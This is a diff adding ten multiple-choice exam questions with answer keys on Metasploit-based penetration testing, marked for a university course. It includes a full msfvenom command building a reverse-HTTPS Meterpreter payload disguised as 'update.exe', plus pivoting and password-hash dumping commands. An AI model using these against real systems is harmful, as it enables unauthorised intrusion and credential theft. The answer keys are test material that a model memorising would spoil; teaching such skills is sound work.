@@ -212,4 +212,206 @@ During a penetration test, a tester discovers a buffer overflow vulnerability in
 
 ---
 
+---
+
+### Question 11
+
+A tester runs `use auxiliary/scanner/portscan/tcp` in Metasploit and sets `RHOSTS 192.168.1.0/24`. What type of Metasploit module is this, and how does it differ from an exploit module?
+
+- A) It is a payload module; payload modules deliver shellcode independently without requiring an exploit
+- B) It is an auxiliary module; auxiliary modules perform supporting tasks (scanning, enumeration, fuzzing, credential testing) that do not deliver a payload or open a session
+- C) It is a post module; post modules require an existing session and this is how Metasploit performs reconnaissance after exploitation
+- D) It is an encoder module; encoder modules modify scan traffic to evade intrusion detection systems
+
+**Correct Answer:** B
+
+**Distractor Analysis:**
+
+- **Why B is correct:** Auxiliary modules in Metasploit perform non-exploitation tasks — scanning, enumeration, fuzzing, denial of service tests, and credential testing — without establishing a session. They do not deliver payloads. The `scanner/portscan/tcp` module specifically conducts TCP port scanning from within the Metasploit framework.
+- **Why A is incorrect:** Payload modules contain shellcode that executes on a compromised target. They are delivered through exploit modules and cannot run independently as scanners.
+- **Why C is incorrect:** Post modules require an existing active session and are used for post-exploitation tasks (privilege escalation, data gathering, persistence). They cannot run without a prior successful exploitation.
+- **Why D is incorrect:** Encoder modules modify payload bytecode to evade signature-based detection. They are used during payload generation (msfvenom), not as standalone network scanners.
+
+---
+
+### Question 12
+
+What is the functional difference between `windows/meterpreter/reverse_tcp` (staged) and `windows/meterpreter_reverse_tcp` (stageless)?
+
+- A) Staged payloads only work on Windows 7; stageless payloads work on all Windows versions
+- B) A staged payload sends a small initial stager that downloads the full Meterpreter DLL from the handler at runtime; a stageless payload contains the complete Meterpreter code in a single self-contained binary
+- C) Staged payloads require SMB to deliver the second stage; stageless payloads use HTTP for delivery
+- D) Stageless payloads are smaller than staged payloads because they do not include the Meterpreter DLL
+
+**Correct Answer:** B
+
+**Distractor Analysis:**
+
+- **Why B is correct:** The `/` in the module path (e.g., `meterpreter/reverse_tcp`) indicates a staged payload — a two-step process where a small stager connects back, receives the Meterpreter DLL (stage 2) from the handler, and executes it in memory. The `_` version (e.g., `meterpreter_reverse_tcp`) is stageless — all Meterpreter code is embedded in the initial executable. Stageless payloads are larger but work in environments where a secondary download is blocked.
+- **Why A is incorrect:** Both staged and stageless payloads support the same range of Windows versions. Compatibility is not determined by staging type.
+- **Why C is incorrect:** The delivery protocol for the second stage is configured by the handler's `LURI` and transport settings, not inherent to the staged/stageless distinction. Both can use TCP, HTTP, or HTTPS for the callback.
+- **Why D is incorrect:** Stageless payloads are actually larger because they contain the complete Meterpreter code. Staged payloads are smaller initially because they only contain the stager.
+
+---
+
+### Question 13
+
+After gaining a Meterpreter session, a tester runs `getsystem` and receives `[-] priv_elevate_getsystem: Operation failed: Access is denied.` What does this indicate and what is the appropriate next step?
+
+- A) The target system is fully patched and privilege escalation is impossible; the tester should abandon this session
+- B) The current session does not have the necessary privileges to use the built-in Metasploit privilege escalation techniques; the tester should enumerate the system for local privilege escalation paths using post modules or manual techniques before retrying
+- C) The Meterpreter session has been detected by antivirus and must be re-established before any commands work
+- D) `getsystem` only works against Linux targets; Windows privilege escalation requires a separate module
+
+**Correct Answer:** B
+
+**Distractor Analysis:**
+
+- **Why B is correct:** `getsystem` attempts several techniques (named pipe impersonation, token duplication, service creation) to elevate from a standard user to SYSTEM. Failure means the current user context lacks privileges to execute those techniques, not that escalation is impossible. The next step is to enumerate local privilege escalation opportunities: unquoted service paths, misconfigured service permissions, kernel exploits, or DLL hijacking opportunities — using modules like `local_exploit_suggester`.
+- **Why A is incorrect:** A single failed `getsystem` attempt does not mean the system is unescalable. Many privilege escalation paths exist beyond the techniques `getsystem` uses.
+- **Why C is incorrect:** Antivirus detection typically terminates the session entirely rather than causing individual commands to return access-denied errors. The error message is a permissions issue, not an AV indicator.
+- **Why D is incorrect:** `getsystem` works against Windows targets specifically. It is not applicable to Linux, where privilege escalation uses entirely different techniques.
+
+---
+
+### Question 14
+
+A tester generates a payload with: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.50 LPORT=443 -f exe -o update.exe`. Why is port 443 and HTTPS used rather than a common high-number port?
+
+- A) Meterpreter only supports HTTPS on port 443 due to TLS certificate requirements
+- B) Port 443 (HTTPS) is commonly allowed outbound through corporate firewalls and blends with normal web traffic, making the callback less likely to be blocked or flagged by network monitoring
+- C) Using port 443 bypasses Windows Defender automatically because security software cannot scan encrypted traffic
+- D) LPORT 443 is required when using 64-bit payloads; 32-bit payloads use port 80
+
+**Correct Answer:** B
+
+**Distractor Analysis:**
+
+- **Why B is correct:** Port 443 outbound is permitted in virtually every corporate environment for HTTPS web browsing. A Meterpreter callback on port 443 using TLS encryption blends with normal user web traffic, making it harder for perimeter firewalls and network-based IDS to distinguish from legitimate HTTPS connections. This is a standard operational security (OPSEC) consideration in payload design.
+- **Why A is incorrect:** Meterpreter HTTPS callbacks can use any port. The LPORT parameter is configurable. The TLS certificate is generated dynamically by the Metasploit handler.
+- **Why C is incorrect:** Modern endpoint detection and response (EDR) products can inspect encrypted traffic via SSL inspection, and Windows Defender detects Meterpreter via behavioral and signature analysis — encrypted transport does not provide automatic AV bypass.
+- **Why D is incorrect:** The LPORT value has no relationship to the payload architecture (32-bit vs. 64-bit). Architecture is specified in the payload name (`windows/x64/` vs. `windows/`).
+
+---
+
+### Question 15
+
+During exploitation of vsftpd 2.3.4 using Metasploit's `unix/ftp/vsftpd_234_backdoor`, the tester sets RHOSTS and runs the exploit but receives `[-] Exploit failed [unreachable]: Rex::ConnectionRefused Connect refused`. What is the most likely cause?
+
+- A) The vsftpd backdoor was already triggered by another attacker and is no longer active
+- B) The target FTP service is not running, the port is firewalled, the IP address is wrong, or the target has been patched — the handler cannot reach the service to trigger the backdoor
+- C) The exploit module is incompatible with the current Metasploit version and must be updated
+- D) vsftpd 2.3.4 backdoor requires a specific command to be sent before the exploit module can connect
+
+**Correct Answer:** B
+
+**Distractor Analysis:**
+
+- **Why B is correct:** `ConnectionRefused` means the TCP connection to RPORT (default 21) was refused by the target. This happens when: the service is not running, a host-based firewall blocks the port, the RHOSTS IP is incorrect, or the target is not reachable. The first diagnostic step is to confirm FTP is accessible: `nmap -p 21 TARGET_IP`.
+- **Why A is incorrect:** The vsftpd backdoor listens on port 6200 after being triggered, but the initial connection for triggering goes to port 21. A previously triggered backdoor would not cause a connection refused on port 21 unless the service itself is also down.
+- **Why C is incorrect:** `ConnectionRefused` is a network connectivity error, not a module compatibility error. Module compatibility issues produce different error types (module load errors, option validation failures).
+- **Why D is incorrect:** The vsftpd backdoor is triggered by sending a username containing `:)` (smiley face) over FTP — the Metasploit module handles this automatically. No manual pre-trigger is required.
+
+---
+
+### Question 16
+
+A tester has a Meterpreter session and wants to pivot to a network segment that is unreachable from the attacker machine but accessible from the compromised host. Which Metasploit command sequence enables this?
+
+- A) `run post/multi/manage/shell_to_meterpreter` to convert the session, then `sessions -l` to list available routes
+- B) `run post/multi/manage/autoroute` or `route add SUBNET NETMASK SESSION_ID` to add a route through the compromised host's session, then use `auxiliary/server/socks_proxy` to proxy tools through the pivot
+- C) `set LHOST` to the target subnet IP and re-run the exploit — Metasploit automatically routes through existing sessions
+- D) `getsystem` then `run post/windows/gather/enum_routes` to enumerate and automatically add all pivot routes
+
+**Correct Answer:** B
+
+**Distractor Analysis:**
+
+- **Why B is correct:** Post-exploitation pivoting requires explicitly adding a route through the compromised host's session so Metasploit knows to forward traffic through that session to reach the target subnet. `autoroute` automates this. Combining it with a SOCKS proxy allows external tools (Nmap, web browsers) to route traffic through the pivot using `proxychains`.
+- **Why A is incorrect:** `shell_to_meterpreter` upgrades a command shell session to Meterpreter — it does not configure network routing. Listing sessions shows active sessions but does not add pivot routes.
+- **Why C is incorrect:** Changing LHOST does not configure routing. Metasploit does not automatically route through existing sessions — routing must be explicitly configured.
+- **Why D is incorrect:** `enum_routes` enumerates the routing table on the compromised host for intelligence purposes but does not automatically configure Metasploit pivoting routes.
+
+---
+
+### Question 17
+
+What is a NOP sled in the context of a buffer overflow exploit, and why is it used?
+
+- A) A NOP sled is a sequence of `0x90` (No Operation) instructions prepended before shellcode; it increases the probability of successful execution by providing a landing zone — if EIP jumps anywhere into the NOP sled, execution slides down to the shellcode
+- B) A NOP sled is a series of repeated JMP instructions that redirect execution across multiple memory pages to evade stack canaries
+- C) A NOP sled is the padding bytes (As) placed before the EIP overwrite to fill the buffer up to the return address offset
+- D) A NOP sled is an Metasploit encoder that replaces null bytes in shellcode with NOP equivalents to ensure clean memory delivery
+
+**Correct Answer:** A
+
+**Distractor Analysis:**
+
+- **Why A is correct:** NOP (`0x90`) instructions perform no operation and simply advance the instruction pointer to the next byte. Prepending 100–200 NOPs before the shellcode creates a landing zone: if memory addresses vary slightly (due to environment variables, stack alignment), the exploit still succeeds as long as EIP lands anywhere in the sled. Execution slides through the NOPs until it reaches the shellcode.
+- **Why B is incorrect:** NOP sleds do not redirect execution across pages and have no direct relationship to stack canary evasion. Stack canaries require different bypass techniques (overwriting the canary with its known value or using format string vulnerabilities).
+- **Why C is incorrect:** The padding bytes that fill the buffer to the EIP offset are typically repeated `\x41` (A) characters — these are not NOP sleds. The NOP sled is placed after the EIP overwrite address, between EIP and the shellcode.
+- **Why D is incorrect:** Null byte removal is performed by Metasploit encoders (e.g., `x86/shikata_ga_nai`), not by NOP sleds. These are separate techniques addressing different problems.
+
+---
+
+### Question 18
+
+A tester successfully exploits a vulnerability and runs `getuid` in Meterpreter, receiving `NT AUTHORITY\NETWORK SERVICE`. What does this indicate about the current access level and what is required to achieve full system compromise?
+
+- A) `NETWORK SERVICE` is a SYSTEM-level account; the tester already has full administrative control of the host
+- B) `NETWORK SERVICE` is a limited built-in Windows account with network access but restricted local privileges; privilege escalation to `NT AUTHORITY\SYSTEM` or a local administrator account is required for full system control
+- C) `NETWORK SERVICE` confirms the tester has domain administrator access because it is a domain service account
+- D) `NETWORK SERVICE` means the tester has read-only access; write operations require re-exploiting with a different payload
+
+**Correct Answer:** B
+
+**Distractor Analysis:**
+
+- **Why B is correct:** `NT AUTHORITY\NETWORK SERVICE` is a built-in Windows low-privilege service account used for services that need to access network resources. It has limited local privileges — it cannot access most system files, cannot install software, and cannot read sensitive registry hives or other users' data. Escalating to `NT AUTHORITY\SYSTEM` (the highest local Windows privilege level) is required for activities like dumping password hashes, reading all files, or manipulating system services.
+- **Why A is incorrect:** `NETWORK SERVICE` is explicitly not a SYSTEM-level account. It is deliberately limited so that compromised services have minimal impact.
+- **Why C is incorrect:** `NETWORK SERVICE` is a local built-in account, not a domain account. It has no inherent domain privileges and does not indicate domain administrator access.
+- **Why D is incorrect:** `NETWORK SERVICE` is not read-only. The account can perform various operations within its privilege scope. The limitation is on elevation-required operations, not all write operations.
+
+---
+
+### Question 19
+
+After gaining SYSTEM-level access on a Windows target through Metasploit, the tester runs `run post/windows/gather/hashdump`. What does this module do and what risk must the tester consider?
+
+- A) It enumerates network interfaces and saves them to a file; the risk is that it generates heavy network traffic
+- B) It extracts NTLM password hashes from the SAM database; the tester must ensure this activity is authorized in the RoE because hash extraction may constitute accessing credential data beyond what is needed to demonstrate the vulnerability
+- C) It dumps all files from the C:\ drive for offline analysis; the risk is excessive disk usage on the attacker machine
+- D) It scans for additional vulnerable services on the compromised host; the risk is triggering IDS alerts from internal scanning
+
+**Correct Answer:** B
+
+**Distractor Analysis:**
+
+- **Why B is correct:** `hashdump` reads the SAM (Security Account Manager) database and extracts NTLM password hashes for all local accounts. These hashes can be cracked offline or used directly in pass-the-hash attacks. Because credential hashes are sensitive data, the RoE must explicitly authorize credential extraction. Many engagement contracts distinguish between "demonstrate SYSTEM access" and "extract/crack credentials" — these may require different authorization levels.
+- **Why A is incorrect:** Network interface enumeration is performed by modules like `arp_scanner` or `ifconfig`. `hashdump` specifically targets the Windows credential store.
+- **Why C is incorrect:** `hashdump` extracts only the credential database (SAM), not all files from C:\. The output is compact (a few KB of hashes) rather than the entire drive.
+- **Why D is incorrect:** `hashdump` reads local system files — it does not perform network scanning and does not generate network traffic that would trigger IDS alerts.
+
+---
+
+### Question 20
+
+The RoE for an engagement specifies "no persistence mechanisms are to be installed on any client system." During post-exploitation, a Metasploit module prompts the tester to "set up persistence for reliable re-access." What is the correct action?
+
+- A) Install persistence only on the highest-value target to minimize footprint while maintaining access
+- B) Decline to install persistence, document the point in the engagement where persistence could have been installed as a finding, and continue post-exploitation within the authorized scope
+- C) Install persistence but disable it immediately after the engagement ends to comply with the RoE
+- D) Request verbal permission from the client's IT contact to install persistence, then proceed if they agree
+
+**Correct Answer:** B
+
+**Distractor Analysis:**
+
+- **Why B is correct:** RoE restrictions are legally binding. Installing persistence when it is explicitly prohibited — even on a single host or "temporarily" — violates the engagement contract and potentially the CFAA. The professional response is to document that persistence installation would have been possible (demonstrating the risk) without actually installing it, then continue working within authorized bounds.
+- **Why A is incorrect:** The RoE says "no persistence on any system." Installing on any system, even one, violates the explicit prohibition. Scope restrictions are not subject to tester judgment about which violations are acceptable.
+- **Why C is incorrect:** Installing persistence and then removing it still violated the RoE at the moment of installation. Additionally, "removal" of persistence mechanisms is never guaranteed to be complete, and any failure leaves artifacts on client systems without authorization.
+- **Why D is incorrect:** Verbal permission does not modify a written RoE. Any scope changes require written approval from the authorized point of contact. Acting on verbal permission exposes the tester to legal risk if the verbal authorizer lacked authority to grant it or later denies the conversation.
+
+---
+
 **Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
